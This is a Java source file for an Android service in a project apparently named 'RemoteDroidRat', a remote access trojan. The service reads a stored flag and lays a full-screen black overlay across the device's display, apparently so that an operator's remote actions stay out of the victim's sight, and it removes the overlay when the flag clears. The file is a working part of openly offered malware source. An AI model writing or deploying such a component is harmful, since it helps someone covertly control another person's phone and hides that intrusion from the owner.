package com.KaranKumar.RemoteDroidRat.services;

import android.content.Context;
import android.view.ViewGroup;
import android.widget.Toast;
import android.view.WindowManager;
import android.os.IBinder;
import android.content.Intent;
import android.graphics.Color;
import android.view.Gravity;
import android.app.Service;
import android.graphics.PixelFormat;
import android.content.SharedPreferences;
import android.util.Log;
import android.provider.Settings;
import android.os.Build;
import android.widget.FrameLayout.LayoutParams;

public class BlackScreen extends Service {

    private static final String TAG = "BlackScreen";

    private Context mContext;
    private ViewGroup myView;
    private WindowManager windowManager;
    private boolean isBlackScreenAdded = false;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        try {
            SharedPreferences sharedPreferences = getSharedPreferences("Screen", Context.MODE_PRIVATE);
            boolean isBlackScreen = sharedPreferences.getBoolean("blkScreen", false);

            if (isBlackScreen && !isBlackScreenAdded) {
                addBlackScreen();
            } else if (!isBlackScreen && isBlackScreenAdded) {
                removeBlackScreen();
            }

        } catch (Exception e) {
            handleException(e);
        }
    }

    private void addBlackScreen() {
        try {
            this.windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            this.myView = new ViewGroup(this) {
                @Override
                protected void onLayout(boolean changed, int l, int t, int r, int b) {
                    // No implementation needed
                }
            };

            this.myView.setBackgroundColor(Color.BLACK);

            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_OVERSCAN,
                PixelFormat.TRANSLUCENT);

            layoutParams.gravity = Gravity.CENTER;
            this.windowManager.addView(this.myView, layoutParams);
            isBlackScreenAdded = true;
            Log.i(TAG, "Black screen is shown.");
        } catch (Exception e) {
            handleException(e);
        }
    }

    private void removeBlackScreen() {
        try {
            if (isBlackScreenAdded) {
                this.windowManager.removeView(this.myView);
                isBlackScreenAdded = false;
                Log.i(TAG, "Black screen is removed.");
            }
        } catch (Exception e) {
            handleException(e);
        }
    }

    private void handleException(Exception e) {
        Log.e(TAG, "Exception: " + e.getMessage());
        e.printStackTrace();
    }
}
